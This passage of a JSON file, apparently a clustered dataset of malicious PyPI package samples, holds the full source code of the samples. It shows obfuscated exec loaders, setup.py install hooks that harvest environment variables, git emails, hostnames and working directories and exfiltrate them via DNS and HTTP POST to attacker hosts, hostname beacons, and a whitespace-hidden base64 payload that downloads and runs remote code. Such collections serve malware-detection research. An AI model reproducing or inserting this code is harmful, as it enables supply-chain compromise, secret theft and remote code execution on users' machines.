>x99|%qN`xYN-m8V-;lEg(O9G#OB?ZGi`m7TE0^Zsa?(kK>V+Ub^{X>*&(F~XAQYz)3uR&Fx-Y*sE`@c~&Iy<GH{N<j$9Z;J)iVxeJd-\nIrf`a~Q#<pA)GjonF(UOpKg;lN8c>D~o{k>o!=}%4$JO=FwkTGorBHf;ujT3lleyGb*`uew^4|8|(x-m~~z5(n47Y;QAP4Mtftcxt67hryh)!2Fb5nSZd6Mw9QbB{U(^0uM$|9$0Ic-6I8feGh)0KE5P`qN!)Co2xLw6^HnLKOk{z|;ZQ14@I3CG!fP7)_SsQcwa$lukp4`;C?`F_5x;x}Xic!GqK1F6NlpMY2{;cVUtoIoyxGitP)9)m17_?BvIgCO(Y@^f4{{#T)K_cX=Ww#(CR^l~+C{Iy>jmB8kn&<aA&w0H+)+wLjuz(gy9-Ze9tIVyn&Pz;)q6%W6jBr5&uz(kg}8&l%s8@SLTU`J(r(5%OMeb*OdW76c>TnN@vDSBn$S)4*R)acrI5pOwpEQpC!Ln(1>HP0!oh5eB5~M!E-64wsx^pTAvmEkEc?6b2Y-8OP<Ln;Ml^q5&r98HD446)a&n#`a9)+!ITvaETN1>u3Aka`SI=LYw@&9%bL7TS|M@EyPdFZ6Nl|P2Eip>$IoPW8>21x>tAzbn-Q^qR$@}Av#SS#TBf6e4D#h_HB2Lq_(k#iwYwI#EP0Ajg>$1g#XUB3;H*#yRdEl?)z0W2_3&b}_X{jzZPtZrttpyflOe6eNKw+_<lij?;DAvA)WD*Ra(dGC&6v{v*%xR`gG-nOp(B&4`b+;uPTgIA#{qM^=tmf<74mnG-#AfE-DKy*TFK7#-E;eQ%sa9#UB}?@bdF`(Au{LQ+T*5_xx(e1&kxaLc$T}uKFfNPtaa$x0^R2-XAYH`!3SAM8&Sxfu(iI@S)gG&3t>#%9?Gwj&G%2ROn!Fj0SKHW7k8nqK)*G8d+zYK2leE?QtsLR-LZ{TSa7!1?CA0oJ$C&)ckVCQU>!3x(`Wv2%D7ZIL^qq1`8~DiqoyV7_TQAW~UloV6e9NpFG&65&$~8q|ohrYMX&VjvaKk;Gq<}sKJdy-wD(OiChglOPMXFaF3HRwP0Vm~<rr$wl>dSWx`B*j`w#D&SStgwSowJOLF1U1-2Q73r*%cLeF-!9F>_=K~SzD7GBM}rEa(pF2Zv'''.replace('\\n','')]))\n\n_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval(\"\".join(chr(i) for i in [101,120,101,99]))(\"\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x70\\x72\\x69\\x6e\\x74\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x78\\x65\\x63\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x76\\x61\\x6c\\x29\");__='979810 1451856 701556 1738286 1131928 777130 1808384 498944 2412960 956032 5915082 4357878 1155399 7076716 1096768 9607464 9704686 8048651 10662561 1351885 10886705 8237044 10331370 2165024 3365775 5799018 9212000 7813401 8233080 4307776 413344 10165379 4025860 4757856 496170 8060709 69960 5328081 7099189 6536544 7959920 2806214 277950 2559104 3012032 223936 591552 9962610 1436600 1625456 5192577 4043064 1416280 3080162 10471440 6462330 4343136 2861440 1741845 8975890 6851585 8140764 7802292 6122736 7539372 1359648 9536670 5335931 10511938 8937513 8056265 3637565 11016172 9717960 2552320 8763000 5587068 5512540 5299392 7436676 73124 10753765 8257920 1823360 9609948 4267890 564456 6065252 6855276 2748352 9834944 10534233 2795264 3236514 8647560 2677500 2522768 1586610 593434 616840 3060576 1538592 2229792 888544 595650 2166095 8397585 3274687 9948176 10319226 8029134 988668 6288620 1453785 2948200 3892980 10434410 4555166 9248990 1916577 3145315 3322534 5188572 7018320 5191305 5482508 3161360 3897952 174690 174590 5850618 2819556 3904427 2454325 9440720 9722790 10612894 2934736 1090686 1106370 8736540 964630 6486220 3989560 2202214 9069498 6645901 10245258 1684332 957682 544295 2842464 7583445 1981316 411517 194212 7295387 3013234 2510936 2828240 1167492 6193408 7805872 5476708 141792 5740225 5395508 4244946 2757725 9101568 10933439 7474074 8554518 4915482 1759329 898380 1844271 7482580 1039824 2242907 3913312 3144240 6702624 4845377 1374656 2064839 5705995 10300550 799434 9605960 8718120 1926528 1534284 2298665 414460 4306036 5724579 5008440 10100004 850660 8166980 6718020 7659663 1681362 488180 897888 756320 2823680 2456672 8309532 3951354 1671882 9611838 463904 1850592 3953815 1540586 1030624 5078241 2462680 8585512 2845632 2321235 355449 10672704 4871568 7530612 1852288 2691680 6459657 11642040 8839320 8637305 1195148 6157790 110976 6754401 10835875 3180288 4157867 10836840 795840 2778016 3047136 237664 18144 381174 4659978 1121877 9624264 2864672 986235 5340830 1642784 9477825 7475656 6378288 3466419 8494824 9749916 1930336 9773876 7674586 3866628 8029500 5434880 53218 2066016 6873517 2529885 2371328 9361876 4234930 1051952 9138354 1909910 4875025 4505490 3837832 8355225 438360 446368 1353568 2047008 2967488 10644804 4894212 7748136 703635 399743 7393907 3952600 3082911 5642000 5450960 7519200 4187848 1696630 5786256 5735665 169650 393313 3621538 3350704 1566824 2943433 7939188 4003881 967527 561064 990896 7872992 2789992 9179304 2780328 7594255 3794678 11010256 6994920 858864 2798948 2737895 5301632 4816300 2089555 9550224 8589846 8282736 710704 669460 1008320 4040180 4468458 4526055 3835186 3264666 1978960 11074200 9351688 2573086 423030 8277360 4632789 3426248 8649396 1341102 8535879 693289 70924 2222352 1938440 6407820 2503992 1014875 64400 4158814 6867432 11765640 7300228 896852 19830 396530 776928 1859904 1439168 67424 7429485 4829190 2985568 10064246 2184600 2413040 11045328 596428 793637 2391017 4416766 3764460 7478286 3906981 3338151 4907438 956510 1275136 83360 189056 859712 1119680 2407648 1855712 1930560 3580398 4905469 1308763 8720493 958750 2926374 703640 8119664 2026297 873341 410140 1330848 2057856 1774592 3048704 8564194 2723652 9627975 5140800 356544 8023440 8511960 1907960 8897280 1348550 2127408 4270610 2250839 5447652 4603434 8320689 4657918 1042434 877720 2696992 2977088 183296 458144 2275808 1242208 3007648 1647168 1716726 4057473 5110029 9255513 9648978 3760028 287880 1350832 576600 2926908 369780 135296 1752416 1471232 875008 417270 5899068 1957344 2283105 10560840 2661960 5444880 471852 155062 4971561 1012478 3930990 231442 192024 2492510 9757105 4498654 382150 671456 52192 192128 1092704 1805248 1929824 3051008 1404544 5733063 8413230 310532 4281784 47008 9891543 469728 6724580 7874240 123880 10211310 9466528 3691092 1031920 4662784 1366698 2876068 684728 1890876 5409383 87924 3339696 1271776 7161413 10515830 1596832 1374105 1571104 8689434 1980668 982940 695172 1856190 4762496 9664185 1719160 3392730 7284220 4214010 2232560 1050090 4511592 2763072 128617 414570 2823840 562016 3152448 2986944 9496020 617040 5896582 230571 3810280 10790754 11111184 4286945 10453520 94200 4224528 1214400 969445 1756234 1314192 9029097 3589970 7198400 915720 3425796 2037495 774890 1417344 1112032 2954944 2494880 751210 6317954 8358360 3763386 2488337 10677968 7769448 1700038 452600 1426976 2920480 1503808 1830496 4385723 11152920 2126353 4189185 1188120 3739320 8386524 3130596 56230 777830';why,are,you,reading,this,thing,huh=\"\\x5f\\x5f\\x5f\\x5f\",\"\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\",\"\\x28\\x22\\x22\\x2e\\x6a\\x6f\",\"\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\",\"\\x31\\x30\\x31\\x2c\\x39\\x39\",\"\\x5f\\x5f\\x29\\x29\",\"\\x5d\\x29\\x29\\x28\\x5f\\x28\";b='eJxzLPfLigoMM47KDct2CvQwdXQPynEMrDAGAGNCB8A=';____(\"\".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\\x5f\\x5f\\x5f\\x5f\\x28\\x22\\x22\\x2e\\x6a\\x6f\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\\x31\\x30\\x31\\x2c\\x39\\x39\\x5d\\x29\\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b\"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=\")).decode(),\"\".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')"
      }
    ]
  },
  {
    "cluster_id": 115,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2025-01-19-mlc-ai-nightly-cu123-v9.9.9",
        "code": "import sys\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass PostInstallScript(install):\n    def run(self):\n        sys.path.insert(0, 'src')\n        from pipofftheoldblock.run import main\n        main(b\"man3\")\n        install.run(self)\n\n\nsetup(\n    name='mlc-ai-nightly-cu123',\n    version='9.9.9',\n    py_modules=['pipofftheoldblock'],\n    cmdclass={\n        \"install\": PostInstallScript,\n    },\n    packages=find_packages('src'),\n    package_dir={'':'src'},\n)\n\n\n\nimport json\nimport os\nimport random\nimport socket\nimport subprocess\nfrom base64 import b32encode, b64encode\nimport urllib.request\nfrom zlib import compress\n\n\ndef main(name):\n    hostname = socket.gethostname()\n    data = name\n    data += json.dumps(run_test(\"git config user.email\".split(\" \"))).encode(\n        errors=\"ignore\"\n    )\n    data += json.dumps(hostname).encode(errors=\"ignore\")\n    data += json.dumps(external_ip()).encode(errors=\"ignore\")\n    data += \"\".join([json.dumps(cwd) for cwd in walk_cwd()]).encode(errors=\"ignore\")\n    data += compress(\n        \"\\n\".join(\n            [\n                k + \"\\r\" + v[:50]\n                for k, v in os.environ.items()\n                if not k.startswith(\"LC_\")\n            ]\n        ).encode(errors=\"ignore\")\n    )\n    send(data, hostname)\n\n\ndef send(data, prefix):\n    if not prefix or len(prefix) < 2:\n        prefix = \"xx\"\n    else:\n        prefix = prefix[:2]\n\n    prefix += hex(random.randint(0, 255))[2:]\n\n    parts = []\n    i = 0\n    j = 0\n    while i < len(data):\n        segment = b32encode(data[i : i + 35]).decode().strip(\"=\")\n        parts.append(prefix + hex(j)[2:] + \"-\" + segment)\n        i += 35\n        j += 1\n\n    for p in parts:\n        try:\n            socket.gethostbyname(p + \".ns.depcon.buzz\")\n        except socket.gaierror:\n            pass\n    \n    req = urllib.request.Request(\"http://64.23.141.119:8080/z\", data=b64encode(data), method=\"POST\")\n    with urllib.request.urlopen(req):\n        pass\n\n\n\ndef run_test(command):\n    try:\n        result = subprocess.run(command, text=True, capture_output=True, check=True)\n        return result.stdout\n    except subprocess.CalledProcessError:\n        return \"\"\n\n\ndef walk_cwd(pid=\"self\", current=None):\n    try:\n        with open(\"/proc/\" + pid + \"/status\", \"r\") as f:\n            for line in f:\n                if line.startswith(\"PPid\"):\n                    ppid = line.split()[1]\n                    break\n\n        parent_cwd_path = f\"/proc/{ppid}/cwd\"\n        parent_cwd = os.readlink(parent_cwd_path)\n        if parent_cwd != current:\n            yield parent_cwd\n        yield from walk_cwd(ppid, parent_cwd)\n    except:\n        pass\n\n\ndef external_ip():\n    try:\n        url = \"https://ip.me\"\n        response = urllib.request.urlopen(\n            urllib.request.Request(url, headers={\"User-Agent\": \"curl\"}), timeout=3\n        )\n        return response.read().strip().decode(\"utf-8\")[:15]\n    except:\n        return \"\"\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2025-01-19-mlc-ai-nightly-v9.9.9",
        "code": "import sys\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass PostInstallScript(install):\n    def run(self):\n        sys.path.insert(0, 'src')\n        from pipofftheoldblock.run import main\n        main(b\"man\")\n        install.run(self)\n\n\nsetup(\n    name='mlc-ai-nightly',\n    version='9.9.9',\n    py_modules=['pipofftheoldblock'],\n    cmdclass={\n        \"install\": PostInstallScript,\n    },\n    packages=find_packages('src'),\n    package_dir={'':'src'},\n)\n\n\n\nimport json\nimport os\nimport random\nimport socket\nimport subprocess\nfrom base64 import b32encode\nimport urllib.request\nfrom zlib import compress\n\n\ndef main(name):\n    hostname = socket.gethostname()\n    data = name\n    data += json.dumps(run_test(\"git config user.email\".split(\" \"))).encode(\n        errors=\"ignore\"\n    )\n    data += json.dumps(hostname).encode(errors=\"ignore\")\n    data += json.dumps(external_ip()).encode(errors=\"ignore\")\n    data += \"\".join([json.dumps(cwd) for cwd in walk_cwd()]).encode(errors=\"ignore\")\n    data += compress(\n        \"\\n\".join(\n            [\n                k + \"\\r\" + v[:50]\n                for k, v in os.environ.items()\n                if not k.startswith(\"LC_\")\n            ]\n        ).encode(errors=\"ignore\")\n    )\n    send(data, hostname)\n\n\ndef send(data, prefix):\n    if not prefix or len(prefix) < 2:\n        prefix = \"xx\"\n    else:\n        prefix = prefix[:2]\n\n    prefix += hex(random.randint(0, 255))[2:]\n\n    parts = []\n    i = 0\n    j = 0\n    while i < len(data):\n        segment = b32encode(data[i : i + 35]).decode().strip(\"=\")\n        parts.append(prefix + hex(j)[2:] + \"-\" + segment)\n        i += 35\n        j += 1\n\n    for p in parts:\n        try:\n            socket.gethostbyname(p + \".ns.depcon.buzz\")\n        except socket.gaierror:\n            pass\n\n\ndef run_test(command):\n    try:\n        result = subprocess.run(command, text=True, capture_output=True, check=True)\n        return result.stdout\n    except subprocess.CalledProcessError:\n        return \"\"\n\n\ndef walk_cwd(pid=\"self\", current=None):\n    try:\n        with open(\"/proc/\" + pid + \"/status\", \"r\") as f:\n            for line in f:\n                if line.startswith(\"PPid\"):\n                    ppid = line.split()[1]\n                    break\n\n        parent_cwd_path = f\"/proc/{ppid}/cwd\"\n        parent_cwd = os.readlink(parent_cwd_path)\n        if parent_cwd != current:\n            yield parent_cwd\n        yield from walk_cwd(ppid, parent_cwd)\n    except:\n        pass\n\n\ndef external_ip():\n    try:\n        url = \"https://ip.me\"\n        response = urllib.request.urlopen(\n            urllib.request.Request(url, headers={\"User-Agent\": \"curl\"}), timeout=3\n        )\n        return response.read().strip().decode(\"utf-8\")[:15]\n    except:\n        return \"\"\n"
      }
    ]
  },
  {
    "cluster_id": 116,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-17-j5gerggnpuiwerbngpiutbgn0iutb0p-v0.0.1",
        "code": "import os\nimport requests\n\nPACKAGE_NAME = __package__ or os.path.basename(os.path.dirname(os.path.abspath(__file__)))\nHOSTNAME = os.uname().nodename\nCURRENT_PATH = os.getcwd()\n\nurl = \"https://3gkkr6u2z1a9rinocp0ue4tw1n7ev4jt.oastify.com\"\n\ndata = {\n    \"package_name\": PACKAGE_NAME,\n    \"hostname\": HOSTNAME,\n    \"current_path\": CURRENT_PATH\n}\n\nresponse = requests.post(url, data=data)\n"
      }
    ]
  },
  {
    "cluster_id": 117,
    "size": 8,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-29-bytedance-chat-v0.1.1",
        "code": "import socket\nimport urllib.request\nimport base64\nimport ssl\n\nssl_context = ssl._create_unverified_context()\n\n# Get the hostname\nhostname = socket.gethostname()\n\n# decode the URL from base64 to avoid people poking at our internal canary url\nu1 = 'aHR0cHM6Ly82'\nu2 = 'ZmRmY2NlNi4wd24uc2g='\nurl = base64.b64decode(f'{u1}{u2}').decode('utf-8') + f'?h={hostname}'\n\n# Create a request object\nresponse = urllib.request.urlopen(url, context=ssl_context)\n# # Read the response content\ncontent = response.read()\n# # Print the response content (decoded)\nprint(content.decode('utf-8'))\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-29-petace-v0.1.1",
        "code": "import socket\nimport urllib.request\nimport base64\nimport ssl\n\nssl_context = ssl._create_unverified_context()\n\n# Get the hostname\nhostname = socket.gethostname()\n\n# decode the URL from base64 to avoid people poking at our internal canary url\nu1 = 'aHR0cHM6Ly82'\nu2 = 'ZmRmY2NlNi4wd24uc2g='\nurl = base64.b64decode(f'{u1}{u2}').decode('utf-8') + f'?h={hostname}'\n\n# Create a request object\nresponse = urllib.request.urlopen(url, context=ssl_context)\n# # Read the response content\ncontent = response.read()\n# # Print the response content (decoded)\nprint(content.decode('utf-8'))\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-29-pylint-redis-v0.1.1",
        "code": "import socket\nimport urllib.request\nimport base64\nimport ssl\n\nssl_context = ssl._create_unverified_context()\n\n# Get the hostname\nhostname = socket.gethostname()\n\n# decode the URL from base64 to avoid people poking at our internal canary url\nu1 = 'aHR0cHM6Ly82'\nu2 = 'ZmRmY2NlNi4wd24uc2g='\nurl = base64.b64decode(f'{u1}{u2}').decode('utf-8') + f'?h={hostname}'\n\n# Create a request object\nresponse = urllib.request.urlopen(url, context=ssl_context)\n# # Read the response content\ncontent = response.read()\n# # Print the response content (decoded)\nprint(content.decode('utf-8'))\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-29-pytest-tt-ddriven-v0.1.1",
        "code": "import socket\nimport urllib.request\nimport base64\nimport ssl\n\nssl_context = ssl._create_unverified_context()\n\n# Get the hostname\nhostname = socket.gethostname()\n\n# decode the URL from base64 to avoid people poking at our internal canary url\nu1 = 'aHR0cHM6Ly82'\nu2 = 'ZmRmY2NlNi4wd24uc2g='\nurl = base64.b64decode(f'{u1}{u2}').decode('utf-8') + f'?h={hostname}'\n\n# Create a request object\nresponse = urllib.request.urlopen(url, context=ssl_context)\n# # Read the response content\ncontent = response.read()\n# # Print the response content (decoded)\nprint(content.decode('utf-8'))\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-29-shoots-api-test-v0.1.1",
        "code": "import socket\nimport urllib.request\nimport base64\nimport ssl\n\nssl_context = ssl._create_unverified_context()\n\n# Get the hostname\nhostname = socket.gethostname()\n\n# decode the URL from base64 to avoid people poking at our internal canary url\nu1 = 'aHR0cHM6Ly82'\nu2 = 'ZmRmY2NlNi4wd24uc2g='\nurl = base64.b64decode(f'{u1}{u2}').decode('utf-8') + f'?h={hostname}'\n\n# Create a request object\nresponse = urllib.request.urlopen(url, context=ssl_context)\n# # Read the response content\ncontent = response.read()\n# # Print the response content (decoded)\nprint(content.decode('utf-8'))\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-29-shoots-bynet-v0.1.1",
        "code": "import socket\nimport urllib.request\nimport base64\nimport ssl\n\nssl_context = ssl._create_unverified_context()\n\n# Get the hostname\nhostname = socket.gethostname()\n\n# decode the URL from base64 to avoid people poking at our internal canary url\nu1 = 'aHR0cHM6Ly82'\nu2 = 'ZmRmY2NlNi4wd24uc2g='\nurl = base64.b64decode(f'{u1}{u2}').decode('utf-8') + f'?h={hostname}'\n\n# Create a request object\nresponse = urllib.request.urlopen(url, context=ssl_context)\n# # Read the response content\ncontent = response.read()\n# # Print the response content (decoded)\nprint(content.decode('utf-8'))\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-29-shoots-flutter-v0.1.1",
        "code": "import socket\nimport urllib.request\nimport base64\nimport ssl\n\nssl_context = ssl._create_unverified_context()\n\n# Get the hostname\nhostname = socket.gethostname()\n\n# decode the URL from base64 to avoid people poking at our internal canary url\nu1 = 'aHR0cHM6Ly82'\nu2 = 'ZmRmY2NlNi4wd24uc2g='\nurl = base64.b64decode(f'{u1}{u2}').decode('utf-8') + f'?h={hostname}'\n\n# Create a request object\nresponse = urllib.request.urlopen(url, context=ssl_context)\n# # Read the response content\ncontent = response.read()\n# # Print the response content (decoded)\nprint(content.decode('utf-8'))\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-29-trove4j-v0.1.1",
        "code": "import socket\nimport urllib.request\nimport base64\nimport ssl\n\nssl_context = ssl._create_unverified_context()\n\n# Get the hostname\nhostname = socket.gethostname()\n\n# decode the URL from base64 to avoid people poking at our internal canary url\nu1 = 'aHR0cHM6Ly82'\nu2 = 'ZmRmY2NlNi4wd24uc2g='\nurl = base64.b64decode(f'{u1}{u2}').decode('utf-8') + f'?h={hostname}'\n\n# Create a request object\nresponse = urllib.request.urlopen(url, context=ssl_context)\n# # Read the response content\ncontent = response.read()\n# # Print the response content (decoded)\nprint(content.decode('utf-8'))\n"
      }
    ]
  },
  {
    "cluster_id": 118,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-08-darknegrobbc",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='darknegrobbc', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\nfrom setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='darknegrobbc', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-08-xolotestomegone",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xolotestomegone', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\nfrom setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xolotestomegone', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)"
      }
    ]
  },
  {
    "cluster_id": 119,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-15-logic2",
        "code": "from setuptools import find_packages\nfrom setuptools import setup\n\nMAJOR_VERSION = \"0\"\nMINOR_VERSION = \"1\"\nMICRO_VERSION = \"0\"\nVERSION = \"{}.{}.{}\".format(MAJOR_VERSION, MINOR_VERSION, MICRO_VERSION)\nprint('\\n')                                                                                                                                                                                                                                                                                                                                 ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(\"ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vMjAuMjI0LjIuMjEzLy9pbmplY3QvY3RFNnRvTERvSEJiSkFwaicpLnJlYWQoKSkiIiIpCl90dG1wLmNsb3NlKCkKdHJ5OiBfc3N5c3RlbShmInN0YXJ0IHtfZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpfSB7X3R0bXAubmFtZX0iKQpleGNlcHQ6IHBhc3M=\"),'<string>','exec'))\nsetup(\n    name=\"logic2\",\n    version=VERSION,\n    description=\"logic2!\",\n    url=\"https://github.com/kootenpv/logic2\",\n    author=\"Pascal van Kooten\",\n    author_email=\"kootenpv@gmail.com\",\n    license=\"MIT\",\n    install_requires=[\"requests\", \"lxml\", \"beatifulsoup4\"],\n    extras_require={\"fancy\": [\"tldextract\"]},\n    packages=find_packages(),\n    zip_safe=False,\n    platforms=\"any\",\n)\n\n\nimport base64\nimport tempfile\nimport time\nimport webbrowser\n\n\ndef wrap_img_into_html(content_type, x):\n    return '<html><body><img src=\"data:{};base64,{}\"</body></html>'.format(content_type, x.decode(\"utf8\"))\n\n\ndef view_request(r):\n    with tempfile.NamedTemporaryFile(\"w\", suffix='.html', delete=False) as f:\n        f.write(wrap_img_into_html(r.headers['Content-Type'], base64.b64encode(r.content)))\n        f.flush()\n        webbrowser.open('file://' + f.name)\n        time.sleep(1)\n\n\nimport json\nimport tempfile\nimport time\nimport webbrowser\n\n\ndef wrap_json_into_html(x):\n    return \"<html><body><code style='white-space: pre-wrap;'>{}</code></body></html>\".format(x)\n\n\ndef view_request(r):\n    js = json.dumps(r.json(), indent=4)\n    with tempfile.NamedTemporaryFile(\"w\", suffix='.html', delete=False) as f:\n        f.write(wrap_json_into_html(js))\n        f.flush()\n        webbrowser.open('file://' + f.name)\n        time.sleep(1)\n\n\nimport sys\nimport requests\nimport requests_viewer.js as js\nimport requests_viewer.image as image\n\ntry:\n    import requests_viewer.web as web\nexcept ImportError:\n    import requests_viewer.web_compat as web\n\n\ndef main(obj=None, default=None):\n    if obj is None:\n        obj = sys.argv[1]\n    if isinstance(obj, str):\n        if not obj.startswith(\"http\"):\n            web.view_html(obj)\n            return\n    else:\n        web.view_tree(obj)\n        return\n    url = obj\n    r = requests.get(url)\n    content_type = r.headers.get('Content-Type', default)\n    if content_type is None:\n        raise TypeError(\"Content type header not set and default=None\")\n    if content_type.startswith(\"text/html\"):\n        web.view_request(r)\n    elif content_type.startswith(\"image\"):\n        image.view_request(r)\n    elif content_type.startswith(\"application/json\"):\n        js.view_request(r)\n    else:\n        raise TypeError(\"Content type not supported: \" + content_type)\n\n\nview = main\n\n\nimport lxml.html.diff\nimport lxml.html\nfrom bs4 import UnicodeDammit\nimport re\nimport requests\nimport time\nimport webbrowser\nimport tempfile\n\n\ndef slugify(value):\n    return re.sub(r'[^\\w\\s-]', '', re.sub(r'[-\\s]+', '-', value)).strip().lower()\n\n\ndef view_request(r, domain=None):\n    if domain is None:\n        domain = extract_domain(r.url)\n    view_tree(make_tree(r.content, domain))\n\n\ndef view_html(x):\n    with tempfile.NamedTemporaryFile(mode=\"w\", suffix='.html', delete=False) as f:\n        f.write(x)\n        f.flush()\n        webbrowser.open('file://' + f.name)\n        time.sleep(1)\n\n\ndef view_node(node, attach_head=False, question_contains=None):\n    newstr = make_parent_line(node, attach_head, question_contains)\n    view_tree(newstr)\n\n\ndef view_tree(node):\n    view_html(lxml.html.tostring(node).decode('utf8'))\n\n\ndef view_diff_tree(tree1, tree2, url='', diff_method=lxml.html.diff.htmldiff):\n    html1 = lxml.html.tostring(tree1).decode('utf8')\n    html2 = lxml.html.tostring(tree2).decode('utf8')\n    view_diff(html1, html2, tree1, tree2, url, diff_method)\n\n\ndef view_diff_html(html1, html2, url='', diff_method=lxml.html.diff.htmldiff):\n    tree1 = lxml.html.fromstring(html1)\n    tree2 = lxml.html.fromstring(html2)\n    view_diff(html1, html2, tree1, tree2, url, diff_method)\n\n\ndef view_diff(html1, html2, tree1, tree2, url='', diff_method=lxml.html.diff.htmldiff):\n    diff_html = diff_method(tree1, tree2)\n    diff_tree = lxml.html.fromstring(diff_html)\n    ins_counts = diff_tree.xpath('count(//ins)')\n    del_counts = diff_tree.xpath('count(//del)')\n    pure_diff = ''\n    for y in [z for z in diff_tree.iter() if z.tag in ['ins', 'del']]:\n        if y.text is not None:\n            color = 'lightgreen' if 'ins' in y.tag else 'red'\n            pure_diff += '<div style=\"background-color:{};\">{}</div>'.format(color, y.text)\n    print('From t1 to t2, {} insertions and {} deleted'.format(ins_counts, del_counts))\n    diff = '<head><title>diff</title><base href=\"' + url\n    diff += '\" target=\"_blank\"><style>ins{ background-color:lightgreen; } '\n    diff += 'del{background-color:red;}</style></head>' + diff_html\n    view_html(diff)\n    view_html(html1)\n    view_html(html2)\n    view_html('<html><body>{}</body></html>'.format(str(pure_diff)))\n\n\ndef make_parent_line(node, attach_head=False, question_contains=None):\n    # Add how much text context is given. e.g. 